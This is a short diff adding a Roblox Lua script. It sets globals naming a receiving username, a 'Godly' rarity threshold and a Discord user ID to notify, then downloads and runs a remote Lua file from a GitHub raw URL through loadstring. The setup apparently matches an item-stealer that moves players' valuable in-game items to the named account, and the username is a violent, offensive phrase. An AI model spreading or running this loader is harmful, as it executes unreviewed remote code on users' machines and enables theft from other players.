@@ -1,0 +1,7 @@
+_G.Username = "CholeBabyKiller" 
+_G.min_rarity = "Godly"
+_G.min_value = 1 
+_G.pingEveryone = "Yes" 
+_G.discuser = "1039920186284838962"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/c12d74e8381fb18cbc885aba.lua'))()
